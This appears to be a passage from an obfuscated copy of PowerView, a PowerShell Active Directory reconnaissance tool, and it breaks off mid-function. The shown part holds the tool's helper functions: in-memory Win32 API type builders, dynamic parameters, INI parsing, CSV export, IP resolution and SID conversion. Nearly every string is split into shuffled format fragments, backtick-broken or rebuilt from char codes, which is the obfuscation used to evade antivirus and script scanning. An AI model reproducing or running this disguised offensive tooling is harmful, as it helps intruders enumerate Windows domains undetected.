












function New-InMemoryModule {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{2}{7}{5}{1}{3}{6}{0}{9}{8}{11}{10}" -f'ng','cessFor','eSh','Sta','PSUs','uldPro','teCha','o','n','i','tions','gFunc'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType(("{3}{0}{1}{4}{2}" -f 'ys','tem.','in','S','AppDoma')).GetProperty(("{1}{3}{0}{2}"-f'rr','C','entDomain','u')).GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}




function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties[("{2}{0}{3}{1}{4}"-f 'aram','erTy','P','et','pes')] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties[("{0}{2}{3}{1}" -f 'Na','ingConvention','ti','veCall')] = $NativeCallingConvention }
    if ($Charset) { $Properties[("{0}{1}" -f'Ch','arset')] = $Charset }
    if ($SetLastError) { $Properties[("{0}{3}{2}{1}" -f'S','ror','Er','etLast')] = $SetLastError }
    if ($EntryPoint) { $Properties[("{1}{0}{2}"-f'tryPo','En','int')] = $EntryPoint }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", ("{1}{6}{4}{2}{3}{0}{5}"-f'i','Pub','reF','ieldIn','ic,Befo','t','l'))
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, ("{4}{5}{6}{0}{1}{2}{3}"-f 'ield','In','i','t','Public',',Befor','eF'))
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                ("{5}{6}{2}{3}{1}{0}{4}" -f'invok','c,P','tat','i','eImpl','P','ublic,S'),
                $ReturnType,
                $ParameterTypes)

            
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField(("{0}{1}{2}{3}"-f'SetLa','st','E','rror'))
            $CallingConventionField = $DllImport.GetField(("{0}{2}{3}{1}"-f'Ca','vention','l','lingCon'))
            $CharsetField = $DllImport.GetField(("{0}{1}"-f'Cha','rSet'))
            $EntryPointField = $DllImport.GetField(("{0}{1}{2}"-f 'Entry','Poin','t'))
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters[("{0}{1}{2}"-f 'Entry','P','oint')]) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum {


    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, ("{1}{0}{2}"-f 'l','Pub','ic'), $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}




function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{


    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = ("{15}{7}{5}{13}{10}{3}{6}{2}{16}{14}{8}{0}{9}{11}{1}{4}{12}"-f'ea','        Befo','lic','        Pu','reFi',' ','b',' ','S','le','ass,
','d,
','eldInit','      Cl','     ','AnsiClass,
',',
   ')

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField(("{1}{2}{0}" -f 'zeConst','S','i')))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    
    
    
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field][("{1}{2}{0}"-f'tion','P','osi')]
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field[("{2}{1}{0}"-f 'me','a','FieldN')]
        $FieldProp = $Field[("{0}{3}{2}{1}"-f'Prope','s','tie','r')]

        $Offset = $FieldProp[("{0}{1}" -f'O','ffset')]
        $Type = $FieldProp[("{0}{1}"-f 'Ty','pe')]
        $MarshalAs = $FieldProp[("{0}{1}{2}" -f'Marsh','al','As')]

        $NewField = $StructBuilder.DefineField($FieldName, $Type, ("{1}{0}"-f'c','Publi'))

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    
    
    $SizeMethod = $StructBuilder.DefineMethod(("{1}{0}" -f 'Size','Get'),
        ("{0}{1}{2}" -f 'P','ublic',', Static'),
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod(("{1}{2}{0}{3}" -f 'peFrom','G','etTy','Handle')))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod(("{2}{1}{0}" -f'f','O','Size'), [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    
    
    $ImplicitConverter = $StructBuilder.DefineMethod(("{2}{3}{1}{0}"-f'licit','Imp','op','_'),
        ("{0}{7}{1}{2}{8}{5}{4}{6}{3}"-f'Pr','teScope',', Public, ','alName','eBySig,','tic, Hid',' Speci','iva','Sta'),
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod(("{3}{1}{2}{0}"-f 'eFromHandle','etT','yp','G')))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod(("{2}{0}{1}"-f'r','ToStructure','Pt'), [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}








Function New-DynamicParameter {


    [CmdletBinding(DefaultParameterSetName = {"{1}{2}{0}"-f 'eter','Dynam','icParam'})]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = "DyNaMicP`A`RaMET`er")]
        [ValidateNotNullOrEmpty()]
        [string]$Name,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "D`Y`NamIcPara`Me`TeR")]
        [System.Type]$Type = [int],

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "DYN`AMiC`P`A`RaMEtEr")]
        [string[]]$Alias,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "dy`NaM`ICparAmE`TeR")]
        [switch]$Mandatory,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "D`ynAMi`c`pa`RaMeT`Er")]
        [int]$Position,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "DY`NaMIC`paR`A`MEtEr")]
        [string]$HelpMessage,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "d`yNAMI`CP`A`RaMeTer")]
        [switch]$DontShow,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "Dy`NAMIcpAR`AmetEr")]
        [switch]$ValueFromPipeline,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "D`Y`N`AMICpA`RaMETeR")]
        [switch]$ValueFromPipelineByPropertyName,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "DynamicpA`RA`me`TER")]
        [switch]$ValueFromRemainingArguments,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "DyNam`icp`Aram`etEr")]
        [string]$ParameterSetName = "__al`lP`ARaM`ETeR`SEtS",

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "d`yN`AMI`cpArA`mEter")]
        [switch]$AllowNull,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "Dy`N`AMIcPaRaM`etER")]
        [switch]$AllowEmptyString,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "dY`Na`m`I`c`PARAMetER")]
        [switch]$AllowEmptyCollection,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "dYN`Amicp`A`RA`mEteR")]
        [switch]$ValidateNotNull,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "dy`NAmICpa`R`A`MEtEr")]
        [switch]$ValidateNotNullOrEmpty,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "d`YN`AmICpArA`mETer")]
        [ValidateCount(2,2)]
        [int[]]$ValidateCount,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "d`yNam`iCparamE`TER")]
        [ValidateCount(2,2)]
        [int[]]$ValidateRange,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "DynA`mIc`P`Aram`ETEr")]
        [ValidateCount(2,2)]
        [int[]]$ValidateLength,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "d`Yna`mIcPa`RAMETeR")]
        [ValidateNotNullOrEmpty()]
        [string]$ValidatePattern,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "dYnam`i`C`pAR`AmeteR")]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$ValidateScript,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "dyna`M`IcP`ARAmEtER")]
        [ValidateNotNullOrEmpty()]
        [string[]]$ValidateSet,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "DyNamI`C`Pa`R`AMEter")]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw ("{13}{0}{16}{5}{7}{6}{9}{1}{3}{2}{18}{10}{11}{4}{17}{12}{14}{15}{8}"-f'ict','o','unt','n.R','me',' Syste','.Management','m','ect','.Automati','d','Para','ti','D','onary ','obj','ionary must be a','terDic','imeDefine')
            }
            $true
        })]
        $Dictionary = $false,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = "Cre`ATeVA`RiAbl`Es")]
        [switch]$CreateVariables,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = "CREA`T`EVaRIab`L`Es")]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            
            
            if($_.GetType().Name -notmatch ("{2}{0}{1}" -f'n','ary','Dictio')) {
                Throw ("{16}{6}{10}{17}{15}{2}{9}{3}{5}{7}{12}{0}{11}{13}{4}{14}{8}{1}" -f'SBoun',' object','b','a','i','gement.','Paramet','Automation.','ary','e a System.Man','ers m','dPara','P','metersD','ction','st ','Bound','u')
            }
            $true
        })]
        $BoundParameters
    )

    Begin {
        $InternalDictionary = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        $CommonParameters = (Get-Command _temp).Parameters.Keys
    }

    Process {
        if($CreateVariables) {
            $BoundKeys = $BoundParameters.Keys | Where-Object { $CommonParameters -notcontains $_ }
            ForEach($Parameter in $BoundKeys) {
                if ($Parameter) {
                    Set-Variable -Name $Parameter -Value $BoundParameters.$Parameter -Scope 1 -Force
                }
            }
        }
        else {
            $StaleKeys = @()
            $StaleKeys = $PSBoundParameters.GetEnumerator() |
                        ForEach-Object {
                            if($_.Value.PSobject.Methods.Name -match (('^Eq'+'ua'+'lsURJ').RePLaCE('URJ','$'))) {
                                
                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                
                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if($StaleKeys) {
                $StaleKeys | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
            }

            
            $UnboundParameters = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        
                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |
                                                
                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }

            
            $tmp = $null
            ForEach ($Parameter in $UnboundParameters) {
                $DefaultValue = Get-Variable -Name $Parameter -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue($Parameter, [ref]$tmp) -and $DefaultValue) {
                    $PSBoundParameters.$Parameter = $DefaultValue
                }
            }

            if($Dictionary) {
                $DPDictionary = $Dictionary
            }
            else {
                $DPDictionary = $InternalDictionary
            }

            
            $GetVar = {Get-Variable -Name $_ -ValueOnly -Scope 0}

            
            $AttributeRegex = (('^(Mandato'+'r'+'y'+'I'+'oG'+'Po'+'s'+'itio'+'nIo'+'GPa'+'r'+'ameterSetNameI'+'oGDontSho'+'wIoGHelpMessa'+'g'+'eIo'+'GValueFromPipelineIoGVal'+'ue'+'FromP'+'ipelineByPropert'+'y'+'Nam'+'eI'+'oG'+'ValueFromRemai'+'nin'+'g'+'A'+'r'+'gume'+'nts)AuK').rEplAcE(([CHar]65+[CHar]117+[CHar]75),'$').rEplAcE(([CHar]73+[CHar]111+[CHar]71),[StRInG][CHar]124))
            $ValidationRegex = ((('^'+'(AllowNullZ26AllowE'+'mptyStringZ26Allo'+'wEm'+'ptyColle'+'ct'+'io'+'nZ26'+'Vali'+'dat'+'eCo'+'u'+'n'+'tZ'+'2'+'6V'+'alidateLengthZ'+'26'+'ValidateP'+'at'+'tern'+'Z26V'+'al'+'idateRan'+'geZ'+'26'+'Va'+'lida'+'te'+'ScriptZ'+'26'+'Valida'+'teSet'+'Z'+'26Val'+'idateNot'+'Nu'+'ll'+'Z26Valida'+'teNotNull'+'OrEmpty)70m')  -ReplACE ([cHAR]90+[cHAR]50+[cHAR]54),[cHAR]124-ReplACE  '70m',[cHAR]36))
            $AliasRegex = {('^Ali'+'as'+'4'+'86').ReplAce('486','$')}
            $ParameterAttribute = New-Object -TypeName System.Management.Automation.ParameterAttribute

            switch -regex ($PSBoundParameters.Keys) {
                $AttributeRegex {
                    Try {
                        $ParameterAttribute.$_ = . $GetVar
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }

            if($DPDictionary.Keys -contains $Name) {
                $DPDictionary.$Name.Attributes.Add($ParameterAttribute)
            }
            else {
                $AttributeCollection = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    $ValidationRegex {
                        Try {
                            $ParameterOptions = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $GetVar) -ErrorAction Stop
                            $AttributeCollection.Add($ParameterOptions)
                        }
                        Catch { $_ }
                        continue
                    }
                    $AliasRegex {
                        Try {
                            $ParameterAlias = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $GetVar) -ErrorAction Stop
                            $AttributeCollection.Add($ParameterAlias)
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $AttributeCollection.Add($ParameterAttribute)
                $Parameter = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $AttributeCollection)
                $DPDictionary.Add($Name, $Parameter)
            }
        }
    }

    End {
        if(!$CreateVariables -and !$Dictionary) {
            $DPDictionary
        }
    }
}


function Get-IniContent {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}{3}{4}"-f'ou','h','PSS','ldPro','cess'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{0}{2}{1}" -f 'F','ame','ullN'}, {"{0}{1}" -f'Na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $OutputObject
    )

    BEGIN {
        $MappedComputers = @{}
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            if (($TargetPath -Match ((("{0}{4}{6}{5}{3}{2}{1}" -f 'dCL','.*','.*dCLdCL','dCL','d','LdCL','C')) -REPLacE  'dCL',[ChAR]92)) -and ($PSBoundParameters[("{2}{1}{0}" -f 'dential','e','Cr')])) {
                $HostComputer = (New-Object System.Uri($TargetPath)).Host
                if (-not $MappedComputers[$HostComputer]) {
                    
                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }

            if (Test-Path -Path $TargetPath) {
                if ($PSBoundParameters[("{2}{1}{3}{0}"-f 'bject','tpu','Ou','tO')]) {
                    $IniObject = New-Object PSObject
                }
                else {
                    $IniObject = @{}
                }
                Switch -Regex -File $TargetPath {
                    ((("{1}{0}{2}"-f'LW[(.+)GL','^G','W]')).REPLacE('GLW',[sTrINg][ChaR]92)) 
                    {
                        $Section = $matches[1].Trim()
                        if ($PSBoundParameters[("{0}{1}{2}" -f'Output','Obj','ect')]) {
                            $Section = $Section.Replace(' ', '')
                            $SectionObject = New-Object PSObject
                            $IniObject | Add-Member Noteproperty $Section $SectionObject
                        }
                        else {
                            $IniObject[$Section] = @{}
                        }
                        $CommentCount = 0
                    }
                    "^(;.*)$" 
                    {
                        $Value = $matches[1].Trim()
                        $CommentCount = $CommentCount + 1
                        $Name = ("{1}{0}{2}" -f'men','Com','t') + $CommentCount
                        if ($PSBoundParameters[("{1}{2}{0}{3}" -f 'Ob','O','utput','ject')]) {
                            $Name = $Name.Replace(' ', '')
                            $IniObject.$Section | Add-Member Noteproperty $Name $Value
                        }
                        else {
                            $IniObject[$Section][$Name] = $Value
                        }
                    }
                    ((("{1}{2}{0}{4}{3}" -f'){0}s*','(.+','?','*)','=(.'))-F  [CHAR]92) 
                    {
                        $Name, $Value = $matches[1..2]
                        $Name = $Name.Trim()
                        $Values = $Value.split(',') | ForEach-Object { $_.Trim() }

                        

                        if ($PSBoundParameters[("{0}{3}{1}{2}" -f 'O','utObj','ect','utp')]) {
                            $Name = $Name.Replace(' ', '')
                            $IniObject.$Section | Add-Member Noteproperty $Name $Values
                        }
                        else {
                            $IniObject[$Section][$Name] = $Values
                        }
                    }
                }
                $IniObject
            }
        }
    }

    END {
        
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}


function Export-PowerViewCSV {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{0}{2}" -f 'o','PSS','uldProcess','h'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $InputObject,

        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $Delimiter = ',',

        [Switch]
        $Append
    )

    BEGIN {
        $OutputPath = [IO.Path]::GetFullPath($PSBoundParameters[("{1}{0}"-f 'h','Pat')])
        $Exists = [System.IO.File]::Exists($OutputPath)

        
        $Mutex = New-Object System.Threading.Mutex $False,("{1}{0}{2}"-f 'SVM','C','utex')
        $Null = $Mutex.WaitOne()

        if ($PSBoundParameters[("{0}{1}{2}" -f 'A','ppe','nd')]) {
            $FileMode = [System.IO.FileMode]::Append
        }
        else {
            $FileMode = [System.IO.FileMode]::Create
            $Exists = $False
        }

        $CSVStream = New-Object IO.FileStream($OutputPath, $FileMode, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        $CSVWriter = New-Object System.IO.StreamWriter($CSVStream)
        $CSVWriter.AutoFlush = $True
    }

    PROCESS {
        ForEach ($Entry in $InputObject) {
            $ObjectCSV = ConvertTo-Csv -InputObject $Entry -Delimiter $Delimiter -NoTypeInformation

            if (-not $Exists) {
                
                $ObjectCSV | ForEach-Object { $CSVWriter.WriteLine($_) }
                $Exists = $True
            }
            else {
                
                $ObjectCSV[1..($ObjectCSV.Length-1)] | ForEach-Object { $CSVWriter.WriteLine($_) }
            }
        }
    }

    END {
        $Mutex.ReleaseMutex()
        $CSVWriter.Dispose()
        $CSVStream.Dispose()
    }
}


function Resolve-IPAddress {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}{3}"-f'ce','s','PSShouldPro','s'}, '')]
    [OutputType({"{5}{1}{10}{2}{7}{11}{0}{8}{3}{4}{9}{6}"-f 'mat','ystem','nage','SC','ust','S','ject','ment.','ion.P','omOb','.Ma','Auto'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{0}{2}{1}"-f'HostNa','e','m'}, {"{2}{0}{1}"-f 'sh','ostname','dn'}, {"{1}{0}" -f 'e','nam'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                @(([Net.Dns]::GetHostEntry($Computer)).AddressList) | ForEach-Object {
                    if ($_.AddressFamily -eq ("{1}{0}{2}"-f 'terN','In','etwork')) {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty ("{2}{0}{3}{1}" -f 'pu','ame','Com','terN') $Computer
                        $Out | Add-Member Noteproperty ("{0}{2}{1}"-f'I','Address','P') $_.IPAddressToString
                        $Out
                    }
                }
            }
            catch {
                Write-Verbose ('[Resolve-'+'IPA'+'d'+'dre'+'s'+'s]'+' '+'C'+'ould '+'n'+'ot '+'r'+'es'+'olve '+"$Computer "+'t'+'o '+'an'+' '+'IP'+' '+'A'+'ddres'+'s.')
            }
        }
    }
}


function ConvertTo-SID {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{4}{2}{0}{3}" -f 'Pr','PSShou','d','ocess','l'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{0}{1}" -f 'N','ame'}, {"{0}{1}"-f'Id','entity'})]
        [String[]]
        $ObjectName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{3}{2}"-f'oma','D','ontroller','inC'})]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $DomainSearcherArguments = @{}
        if ($PSBoundParameters[("{0}{1}"-f'Doma','in')]) { $DomainSearcherArguments[("{1}{0}" -f 'n','Domai')] = $Domain }
        if ($PSBoundParameters[("{0}{1}" -f'Serve','r')]) { $DomainSearcherArguments[("{1}{0}"-f 'er','Serv')] = $Server }
        if ($PSBoundParameters[("{1}{2}{0}"-f'tial','Cre','den')]) { $DomainSearcherArguments[("{0}{1}{3}{2}" -f 'C','rede','al','nti')] = $Credential }
    }

    PROCESS {
